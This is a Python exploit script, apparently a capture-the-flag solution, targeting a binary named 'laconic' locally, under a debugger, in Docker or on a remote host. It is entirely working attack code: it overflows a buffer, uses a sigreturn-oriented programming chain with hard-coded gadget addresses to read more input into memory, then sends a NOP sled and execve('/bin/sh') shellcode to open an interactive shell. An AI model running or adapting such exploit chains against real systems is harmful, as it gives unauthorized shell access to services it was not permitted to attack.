#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./laconic', checksec=False)
libc = exe.libc

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b *0x43017
c
'''.format(**locals())

p = init()

# ==================== EXPLOIT ====================

def exploit():

    offset = 8
    syscall = 0x43015 # syscall; ret;
    pop_rax = 0x43018

    frame = SigreturnFrame()
    frame.rdi = 0
    frame.rsi = 0x43000
    frame.rdx = 0x50
    frame.rip = syscall
    frame.rsp = 0x43000

    payload = flat({
        offset: [
            pop_rax,
            0xf,
            syscall,
            frame
        ]
    })

    # print(len(payload))
    s(payload[:262])

    sc = asm('''

        execve:
            lea rdi, [rip+sh]

            xor rsi, rsi
            xor rdx, rdx

            mov rax, 0x3b
            syscall

        sh:
            .ascii "/bin/sh"
            .byte 0

    ''')

    s(b'\x90' * 0x30 + sc)

    interactive()

if __name__ == '__main__':
    exploit()
